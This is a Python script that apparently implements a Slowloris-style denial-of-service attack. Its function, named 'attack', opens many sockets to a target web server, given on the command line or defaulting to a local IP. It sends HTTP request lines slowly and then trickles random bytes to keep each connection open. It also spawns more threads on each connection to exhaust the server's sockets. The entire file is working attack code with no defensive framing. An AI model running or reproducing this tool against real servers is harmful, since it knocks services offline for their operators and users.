import sys
import socket as s
import time
import random
from _thread import *
args = sys.argv
#PutToStack(args)
if len(args) < 2:
    target_host = '192.168.0.119'
else:
    target_host = args[1]
if len(args) < 3:
    target_port = 80
else:
    target_port = int(args[2])
Valid_HTTP_Requests = ["GET http://"+target_host+"/","GET http://"+target_host+"/index.html","GET http://"+target_host+"/favicon.ico"]#without ending
Count = 0
Max_threads = 10
printStack = []
printStat = True
tempStack = []
def PutToStack(string):
    global printStack
    global printStat
    global tempStack
    if printStat:
        printStack.append(string)
        printStack += tempStack
        tempStack = []
    else:
        tempStack.append(string)
avg_timeout = 0
def attack(host,port,request,est_timeout):
    global Count
    global Max_threads
    global avg_timeout
    #PutToStack("Count\t:"+str(Count)+"\tTimeout:"+str(est_timeout))
    Count += 1

    try:
        sock = s.socket()
        sock.connect((host,port))
    except Exception as e:
        print(e)
        PutToStack("All host sockets are full")
    new_timeout = est_timeout
    cumulative_timeout = 0
    try:
        try:
            for x in range(0,len(request)):
                sock.sendall(request[x].encode())
                time.sleep(est_timeout)
                cumulative_timeout += est_timeout
            avg_timeout = (avg_timeout + (2*est_timeout))/3
        except:
            avg_timeout = ((2*avg_timeout) + est_timeout)/3
        start_new_thread(attack,(host,port,request,avg_timeout))
        start_new_thread(attack,(host,port,request,avg_timeout))
        while True:
            sock.sendall(str(random.randrange(0,9,1)).encode())
            cumulative_timeout += est_timeout
    except Exception as e:
        PutToStack(str(Count))
        PutToStack(e)
        new_timeout -= 0.1
        try:
            if Max_threads == None or Count < Max_threads:
                start_new_thread(attack,(host,port,request,avg_timeout-0.001))
                start_new_thread(attack,(host,port,request,avg_timeout+0.1))
            else:
                PutToStack("Maximum Number of threads achieved")
        except:
            Max_threads = Count
            PutToStack("Maximum Number of threads achieved")
        Count -= 1
avg_timeout = 0.1
for r in range(0,len(Valid_HTTP_Requests)):
    start_new_thread(attack,(target_host,target_port,Valid_HTTP_Requests[r],avg_timeout))
while True:
    printStat = False

    for i in range(0,len(printStack)):
        print(printStack[i])
        print("Max Limit:",Max_threads,"\tAvg Timeout:",avg_timeout,"\tConnections count:",Count)
    printStack = []
    printStat = True
    time.sleep(1)
